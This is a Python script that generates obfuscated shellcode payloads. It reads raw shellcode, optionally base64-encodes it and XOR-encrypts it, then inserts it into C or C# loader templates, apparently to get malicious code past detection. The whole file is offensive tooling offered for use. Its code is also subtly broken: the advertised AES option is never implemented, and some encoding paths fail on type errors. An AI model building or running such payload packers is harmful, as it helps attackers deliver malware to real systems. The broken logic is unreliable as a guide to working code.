import base64, sys, argparse

def xorpayload(strchipher,  key):
	return [hex(strchipher[i] ^ ord(key[i % len(key)])) for i in range(len(strchipher))]

def b64payload(payload):
	return base64.b64encode(payload).decode()

def putkey(Mainstr, key):
	return Mainstr.replace("key:", key)

def putpayload(Mainstr, payload):
	return Mainstr.replace("payload:", payload)

def getshellcode(filename):
	return open(filename, 'rb').read()

def gettemplate(tempname):
	return open(tempname).read()

def resultcreate(filename, data):
	with open(filename, "w") as f:
		f.write(data)

if __name__ == "__main__":
	mparse = argparse.ArgumentParser()
	mparse.add_argument('-cs', '--csharp', action="store_true", help="-cs , --csharp\tCreate C# shellcode .\n")
	mparse.add_argument('-c', '--ansi-c', action="store_true", help="-c , --ansi-c\tCreate C shellcode .")
	mparse.add_argument('-t', '--template', metavar='template.c or template.cs',  help="-t , --template\tInclude the template you need to use . \n")
	mparse.add_argument('-b64', '--encode-base64', action="store_true", help="-b64 , --encode-base64\tUse Base64 encoding. \n")
	mparse.add_argument('-xor', '--encrypt-xor', metavar='XOR_KEY', help="-xor , --encrypt-xor\tUse XOR followed with the encryption key. \n")
	mparse.add_argument('-aes', '--encrypt-aes', metavar='AES_KEY', help="-aes , --encrypt-aes\tUse AES followed with the encryption key. \n")
	mparse.add_argument('-s', '--shellcode-file', metavar='RAW-SHELLCODE.bin', help="-s\t--shellcode-file\tRaw shellcode file . \n")
	args = mparse.parse_args()
	if args.shellcode_file == None:
		print("You must Use -s ( --shellcode-file )")
		exit()
	shellcode = getshellcode(args.shellcode_file)
	result = ""
	if args.ansi_c :
		print("Creating C Payload.....")
		result = shellcode
		if args.encode_base64:
			print("\t[*] Encoding Shellcode with Base64.")
			result = b64payload(shellcode)
		if args.encrypt_xor != None :
			print("\t[*] Encrypting Shellcode with XOR with Key : {}.".format(args.encrypt_xor))
			result = xorpayload(result,  args.encrypt_xor)
		if args.template != None:
			template = gettemplate(args.template)
			result = ''.join('\\x' + c[2:] for c in result)
			template = putpayload(template, str(result))
			if args.encrypt_xor != None :
				template = putkey(template, args.encrypt_xor)
			resultcreate("result.cpp", template)

	if args.csharp :
		print("Creating C# Payload.....")
		result = shellcode
		if args.encode_base64:
			print("\t[*] Encoding Shellcode with Base64.")
			result = b64payload(shellcode)
		if args.encrypt_xor != None :
			print("\t[*] Encrypting Shellcode with XOR with Key : {}.".format(args.encrypt_xor))
			result = xorpayload(str(result),  args.encrypt_xor)
		if args.template != None:
			template = gettemplate(args.template)
			template = putpayload(template, result)
			if args.encrypt_xor != None :
				template = putkey(template, args.encrypt_xor)
			resultcreate("result.cs", template)
		print("byte[] shellcode = new byte[] {" + result + "};")
